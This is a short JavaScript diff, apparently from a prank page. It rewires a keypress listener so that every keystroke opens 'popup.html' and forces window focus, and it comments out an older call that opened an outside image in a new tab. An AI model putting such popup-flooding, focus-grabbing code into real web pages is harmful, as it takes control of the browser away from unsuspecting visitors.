@@ -42,11 +42,17 @@ function interceptUserInput (onInput) {
   document.body.addEventListener('keypress', onInput)
 }
 
-interceptUserInput(
+interceptUserInput(function() {
+  openWindow('popup.html')
+  focusWindows()
+})
+
+/*
   focusWindows()
   openWindow('popup.html')
-  window.open('https://th.bing.com/th/id/OIP.kg5K90km9f6w5-ytn3iXLwHaEo?rs=1&pid=ImgDetMain','_blank', '')
-)
+  window.open('https://th.bing.com/th/id/OIP.kg5K90km9f6w5-ytn3iXLwHaEo?rs=1&pid=ImgDetMain','_blank', ''
+*/
+console.log('i hate those errors')
 /* document.getElementById("LULZ").addEventListener('click', e => {
   openWindow('popup.html')
   openWindow('popup.html')
